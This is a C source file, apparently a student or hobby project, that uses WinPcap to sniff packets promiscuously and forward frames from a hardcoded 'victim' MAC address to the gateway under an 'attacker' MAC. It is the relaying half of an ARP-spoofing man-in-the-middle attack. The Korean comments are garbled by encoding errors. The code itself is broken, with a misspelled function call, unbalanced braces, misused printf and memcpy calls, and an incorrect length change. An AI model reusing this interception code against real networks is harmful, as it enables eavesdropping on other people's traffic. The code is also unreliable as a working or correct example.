#include<WinSock2.h> // htons(), htonl() �Լ��� ���
#include<pcap.h> // ��Ʈ��ũ ���α׷��� �Լ��� ����
#include<stdio.h>
#include<stdint.h> // ���� �ڷ����� �����Ͽ� ����
#include<string.h>


#pragma warning(disable:4996)
#pragma warning(disable:6011)

#define ETH_LEN 6
#define IP_LEN 4

#define ETHERTYPE_ARP 0x0806

#pragma pack(push, 1)
typedef struct ether_header // �̴��� �κ��� ��
{
	uint8_t dst_host[ETH_LEN]; // uint8_t�� 0~255������ ������ ���´�. 
	uint8_t src_host[ETH_LEN];
	uint16_t ether_type; // uint16_t�� 0~65,535 ������ ����.
}ether_header;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct ipv4_header
{
	uint8_t ver; //����
	uint8_t tos; //��������
	uint16_t tlen; //��ü ����
	uint16_t identi; //�ĺ�
	uint16_t flags; //�÷���
	uint8_t ttl; //�ǽð�
	uint8_t proto; //��������
	uint16_t crc; //üũ��
	uint8_t saddr[IP_LEN]; // �ҽ� �ּ�
	uint8_t daddr[IP_LEN]; // ������ �ּ�
	u_int op_pad; //�ɼ� �� �е� 
}ipv4_header;
#pragma pack(pop)






void main()
{
	pcap_if_t* alldevs;
	pcap_if_t* d;
	int inum;
	int i = 0;
	pcap_t* adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	int res;
	struct tm* ltime;
	struct pcap_pkthdr* header;
	const u_char* pkt_data;
	time_t local_tv_sec;
	u_int ip_len;
	ipv4_header* ih;
	ether_header* eh;
	uint8_t victim[ETH_LEN] = { 0x18, 0x67, 0xb0, 0xca, 0xb4, 0xb1 };
	uint8_t attackerip[IP_LEN] = { 192,168,42,30 };
	uint8_t gatewaym[ETH_LEN] = { 0x88, 0x36, 0x6c, 0x7a, 0x56, 0x40 };
	uint8_t attackerm[ETH_LEN] = { 0xb0, 0x6e, 0xbf, 0xc6, 0xfa, 0x45 };


	/*���� ��ǻ�Ϳ��� ��ġ ����� �˻�*/
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		printf(stderr, "Error in pcap_findalldeves_ex: %s\n", errbuf);
		exit(1);
	}

	/*����� �μ�*/
	for (d = alldevs; d != NULL; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (NO description available(��� ������ ���� ����))\n");
	}

	if (i == 0)
	{
		printf("\n �������̽��� ã�� �� �����ϴ�! WinPcap�� ��ġ�Ǿ� �ִ��� Ȯ���Ͻʽÿ�.\n");
		return -1;
	}

	printf("�������̽� ��ȣ (1-%d)�� �Է��Ͻʽÿ� : ", i);
	scanf("%d", &inum);

	if (inum<1 || inum>i)
	{
		printf("\n�������̽� ��ȣ�� ������ ������ϴ�.\n");
		/*��ġ ��� ����*/
		pcap_freealldevs(alldevs);
		return -1;
	}

	/*���õ� ����ͷ� �̵�*/
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	/*��ġ����*/
	if ((adhandle = pcap_open(d->name,			//��ġ�̸�
		65536,			//ĸó �� ��Ŷ �κ�
		PCAP_OPENFLAG_PROMISCUOUS,	//������ ���
		1000,			//�б� �ð� �ʰ�
		NULL,			//���� �ý��ۿ����� ����
		errbuf			//���� ����
	)) == NULL)
	{
		printf(stderr, "\n ���ó�� �� �� �����ϴ�. %s�� WinPcap���� �������� �ʽ��ϴ�. \n", d->name);
		/*��ġ ��� ����*/
		pcap_freealldevs(alldevs);
		return -1;
	}


	printf("\nlistening on %s...\n", d->description);


	pcap_freealldevs(alldevs);

	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0) {
		if (res == 0)
			/*�ð� �ʰ�*/
			continue;

		ih = (ipv4_header*)(pkt_data + 14);//�̴��� ��� ����
		ip_len = (ih->ver & 0xf) * 4;
		eh = (ether_header*)pkt_data;
		u_int8_t* dstmac = eh->dst_host;
		u_int8_t* srcmac = eh->src_host;
		u_char* srcip = ih->saddr;
		u_char* dstip = ih->daddr;
		int count = 0;
		int count2 = 0;
		u_char* packet[10000];



			if (srcmac[0] == victim[0]&& srcmac[1] == victim[1] && srcmac[2] == victim[2] &&
				srcmac[3] == victim[3] && srcmac[4] == victim[4] && srcmac[5] == victim[5])
			{
				if (dstip[0] != attackerip[0] || dstip[1] != attackerip[1] || dstip[2] != attackerip[2]
					|| dstip[3] != attackerip[3]) {

					rintf("��������µ�\n");
					memcpy(eh->src_host, attackerm, sizeof(eh->src_host));
					memcpy(eh->dst_host, gatewaym, sizeof(eh->dst_host));
					memcpy(packet, &eh, sizeof(eh));
					header->len += sizeof(eh);

					pcap_sendpacket(adhandle, pkt_data, header->len);

					printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x\n",
						eh->src_host[0],
						eh->src_host[1],
						eh->src_host[2],
						eh->src_host[3],
						eh->src_host[4],
						eh->src_host[5],

						eh->dst_host[0],
						eh->dst_host[1],
						eh->dst_host[2],
						eh->dst_host[3],
						eh->dst_host[4],
						eh->dst_host[5]);
				}
				}
			}
		}
		if (res == -1) 
			printf("��Ŷ �б� ���� : %s\n", pcap_geterr(adhandle));
			return -1;	
}
	